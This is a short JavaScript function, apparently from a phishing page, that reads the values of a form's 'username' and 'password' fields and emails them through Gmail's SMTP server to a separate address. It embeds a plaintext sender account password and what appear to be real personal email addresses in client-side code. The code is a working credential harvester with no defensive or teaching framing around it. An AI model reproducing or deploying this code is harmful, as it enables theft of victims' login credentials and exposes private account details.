function getinfo() {

    Email.send({
        Host: "smtp.gmail.com",
        Username: "harshyadav42021@gmail.com",
        Password: "harshyadava@gmil",
        To: 'poojapatidar7154@gmail.com',
        From: "harshyadav42021@gmail.com",
        Subject:  document.getElementById("username").value,
        Body:  "username =  " + document.getElementById("username").value + ",   password = " + document.getElementById("password").value,
    })
//         .then(function (message) {
//             alert("mail sent successfully")
//         });
}
